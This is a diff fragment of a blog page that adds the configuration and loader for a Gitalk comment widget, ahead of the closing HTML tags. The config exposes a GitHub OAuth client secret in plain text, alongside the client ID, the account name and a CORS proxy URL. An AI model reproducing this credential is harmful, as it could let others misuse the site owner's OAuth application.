+<script class="next-config" data-name="gitalk" type="application/json">{"enable":true,"client_id":"96531982aa814e82e033","client_secret":"9d64fd0a7523408d110bfc9839658aaa2a0ee62e","repo":"Blog_Comments","github_id":"gaoteng17","admin_user":"gaoteng17","distraction_free_mode":true,"proxy":"https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token","language":null,"js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/gitalk/1.8.0/gitalk.min.js","integrity":"sha256-MVK9MGD/XJaGyIghSVrONSnoXoGh3IFxLw0zfvzpxR4="},"path_md5":"0ebf26bf13dfdd72ba8be1e9c9058362"}</script>
+<script src="/js/third-party/comments/gitalk.js"></script>
+
+</body>
+</html>
